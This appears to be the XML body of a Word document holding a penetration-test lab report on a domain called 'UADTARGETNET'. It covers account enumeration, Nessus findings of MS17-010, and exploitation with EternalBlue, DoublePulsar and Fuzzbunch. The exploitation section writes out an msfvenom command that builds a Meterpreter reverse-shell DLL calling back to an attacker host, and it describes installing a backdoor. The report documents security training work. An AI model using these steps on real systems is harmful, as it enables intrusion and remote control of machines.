    <w:p w:rsidR="00AA43DC" w:rsidRDefault="00AA43DC" w:rsidP="00885904">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="570C4B7E" wp14:editId="0DB8FC57">
            <wp:extent cx="4057650" cy="542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542925"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AA43DC" w:rsidRDefault="00AA43DC" w:rsidP="00885904">
      <w:r>
        <w:t>Figure 2.2.3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AA43DC" w:rsidRDefault="00AA43DC" w:rsidP="00885904"/>
    <w:p w:rsidR="00394D3B" w:rsidRDefault="00AA43DC" w:rsidP="00AA43DC">
      <w:r>
        <w:t>Using the command “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00394D3B">
        <w:t>querydominfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>”, it was found that the domain name for the servers is “UADTARGETNET”, and that there are 155 users on the server.</w:t>
      </w:r>
      <w:r w:rsidR="00394D3B">
        <w:t xml:space="preserve"> This can be seen in figure 2.2.4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00394D3B" w:rsidRDefault="00394D3B" w:rsidP="00AA43DC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="008C5E28" wp14:editId="7CD3A7A4">
            <wp:extent cx="4141304"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935" t="49288" r="39424" b="24501"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4147817" cy="2384995"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00AA43DC">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00394D3B" w:rsidRDefault="00394D3B" w:rsidP="00AA43DC">
      <w:r>
        <w:t>Figure 2.2.4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AA43DC" w:rsidRDefault="00AA43DC" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>From the results of the command</w:t>
      </w:r>
      <w:r w:rsidR="00394D3B">
        <w:t xml:space="preserve"> “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00394D3B">
        <w:t>lookupnames</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00394D3B">
        <w:t xml:space="preserve"> administrator”</w:t>
      </w:r>
      <w:r>
        <w:t>, it was seen that the SID of the administrator was: “</w:t>
      </w:r>
      <w:r w:rsidRPr="00896A8C">
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>S-1-5-21-3143832578-2511123263-3969369323-500</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>”. This also showed that one of the usernames with admin privileges is called “administrator”.</w:t>
      </w:r>
      <w:r w:rsidR="00394D3B">
        <w:rPr>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> See figure 2.2.5.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00394D3B" w:rsidRDefault="00394D3B" w:rsidP="00AA43DC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="16FA7D3C" wp14:editId="083E688F">
            <wp:extent cx="5190155" cy="514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915" t="69259" r="24841" b="23648"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5335827" cy="528786"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00394D3B" w:rsidRDefault="00394D3B" w:rsidP="00AA43DC">
      <w:r>
        <w:t>Figure 2.2.5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0031410B" w:rsidRDefault="0031410B" w:rsidP="00AA43DC"/>
    <w:p w:rsidR="0031410B" w:rsidRDefault="0031410B" w:rsidP="00AA43DC">
      <w:r>
        <w:t xml:space="preserve">To find out the usernames on the servers, Nbtenum3.3 was be used. This is a tool used by windows, that creates a html file with </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>all of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the admin and user accounts. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0031410B" w:rsidRDefault="0031410B" w:rsidP="00AA43DC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="70232A11" wp14:editId="48E31F86">
            <wp:extent cx="5285664" cy="1609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378" t="26781" r="28366" b="54131"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5288866" cy="1610700"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0031410B" w:rsidRDefault="0031410B" w:rsidP="00AA43DC">
      <w:r>
        <w:t>Figure 2.2.6</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0031410B" w:rsidRDefault="00F21F43" w:rsidP="00AA43DC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251663360" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="7FC3648D" wp14:editId="05F5817E">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:align>left</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>565150</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="3853543" cy="228600"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="19800"/>
                <wp:lineTo x="21465" y="19800"/>
                <wp:lineTo x="214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359" t="26496" r="37820" b="69515"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3853543"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10B">
        <w:t xml:space="preserve">Figure 2.2.6 shows the html document being created through </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0031410B">
        <w:t>nbtenum</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0031410B">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="002B0FD1">
        <w:t xml:space="preserve">The second line of code specifies the </w:t>
      </w:r>
      <w:r>
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidR="002B0FD1">
        <w:t xml:space="preserve"> address of the server, along with the domain name. A valid username and password are then entered for authorization into the system. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00F21F43" w:rsidRDefault="00F21F43" w:rsidP="00AA43DC"/>
    <w:p w:rsidR="002B0FD1" w:rsidRDefault="002B0FD1" w:rsidP="00AA43DC">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Figure 2.2.7</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002B0FD1" w:rsidRDefault="002B0FD1" w:rsidP="00AA43DC">
      <w:r>
        <w:t xml:space="preserve">Figure 2.2.7 shows that the html file has been created successfully. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002B0FD1" w:rsidRDefault="002B0FD1" w:rsidP="00AA43DC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14A2BA2A" wp14:editId="2A2230EA">
            <wp:extent cx="3269708" cy="40767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30" t="11680" r="56410" b="4843"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3276289" cy="4084905"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="002B0FD1" w:rsidRDefault="002B0FD1" w:rsidP="00AA43DC">
      <w:r>
        <w:t>Figure 2.2.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002B0FD1" w:rsidRDefault="002B0FD1" w:rsidP="00AA43DC">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5CB8B502" wp14:editId="4A289808">
            <wp:extent cx="2680086" cy="34004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18" r="59455" b="5128"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2682700" cy="3403742"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="002B0FD1" w:rsidRDefault="002B0FD1" w:rsidP="00AA43DC">
      <w:r>
        <w:t>Figure 2.2.9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002B0FD1" w:rsidRDefault="002B0FD1" w:rsidP="00AA43DC">
      <w:r>
        <w:t xml:space="preserve">Figure 2.2.8 and 2.2.9 show the contents of the html file. The file shows </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>all of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> the domain usernames of the account, and specifies which one shave admin privileges. This can be extremely useful for when deciding which account to try and gain access to. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0031410B" w:rsidRDefault="0031410B" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00394D3B" w:rsidRDefault="00394D3B" w:rsidP="00394D3B">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r w:rsidRPr="00394D3B">
        <w:t>Vulnerability Scanning</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00394D3B" w:rsidRDefault="00DB3416" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve">The two main tools that were used to search for vulnerabilities in the systems were NMAP and Nessus. Both tools provided a large amount of vulnerabilities on each server. One vulnerability that was common across all four machines, and found in Nessus, was MS17-010. See figure 2.3.1 for full details. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DB3416" w:rsidRDefault="00DB3416" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="397FCD84" wp14:editId="218677D6">
            <wp:extent cx="5891915" cy="142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80" t="38745" r="1122" b="29266"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6127255" cy="1485818"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="000E6B21" w:rsidRDefault="000E6B21" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>Figure 2.3.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000E6B21" w:rsidRDefault="000E6B21" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve">This exploit became the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>main focus</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve">, as it allowed us to gain access directly to the servers. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000E6B21" w:rsidRDefault="000E6B21" w:rsidP="000E6B21">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>System Hacking</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB0E11" w:rsidRPr="00EB0E11" w:rsidRDefault="00EB0E11" w:rsidP="00EB0E11">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Fuzzbunch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="000E6B21" w:rsidRDefault="000E6B21" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve">The exploit that was used first was a program called </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>fuzzbunch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>Fuzzbunch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> allowed backdoors to be installed on the server, thus making it possible to man</w:t>
      </w:r>
      <w:r w:rsidR="00132909">
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve">ulate the </w:t>
      </w:r>
      <w:r w:rsidR="00B94509">
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve">server and clients into giving </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve">information about the </w:t>
      </w:r>
      <w:r w:rsidR="00B94509">
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>user’s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> accounts.</w:t>
      </w:r>
      <w:r w:rsidR="00B94509">
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> Once the backdoor was created, a malicious DLL that was created previously was transferred to the server, to give us free reign over the account. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B94509" w:rsidRDefault="00133EDD" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>First</w:t>
      </w:r>
      <w:r w:rsidR="00B94509">
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>, a connection was made in a program called Armitage in Kali, to listen to port 4444. This i</w:t>
      </w:r>
      <w:r w:rsidR="003A1321">
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="00B94509">
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve"> the port that the connection will be set up to. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B94509" w:rsidRDefault="00B94509" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t xml:space="preserve">Windows is used to create </w:t>
      </w:r>
      <w:r w:rsidRPr="00B94509">
        <w:t>the malicious DLL, using the code “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B94509">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>msfvenom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B94509">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p windows/x64/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B94509">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B94509">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B94509">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B94509">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> LHOST=192.168.0.100 LPORT=4444 -f </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B94509">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t>dll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B94509">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt; /root/Desktop/msf.dll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B94509" w:rsidRDefault="00B94509" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B94509">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>After the DLL is created, eternal blue is used to install the backdoor on the target system. In this case, the server 192.168.0.1.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B94509" w:rsidRDefault="00B94509" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4736E303" wp14:editId="1FAFC368">
            <wp:extent cx="5609840" cy="470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r="58620" b="38294"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5612771" cy="4707808"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B94509" w:rsidRDefault="00B94509" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure 2.4.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B94509" w:rsidRDefault="00B94509" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Figure 2.4.1 shows the backdoor being installed successfully. Eternal blue </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the SMB protocol on port 445. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B94509" w:rsidRDefault="00B94509" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Afterwards, </w:t>
      </w:r>
      <w:r w:rsidR="007504C1">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a tool from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="007504C1">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>fuzz</w:t>
      </w:r>
      <w:r w:rsidR="003A1321">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>bunch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003A1321">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> called double pulsar is used to transfer the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="003A1321">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>dll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="003A1321">
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> file to the server.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> This can be seen in figure 2.4.2.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B94509" w:rsidRDefault="00B94509" w:rsidP="00AA43DC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6DC523B7" wp14:editId="3EF82867">
            <wp:extent cx="5429250" cy="67700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165" t="2068" r="787" b="6933"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5432050" cy="6773568"/>
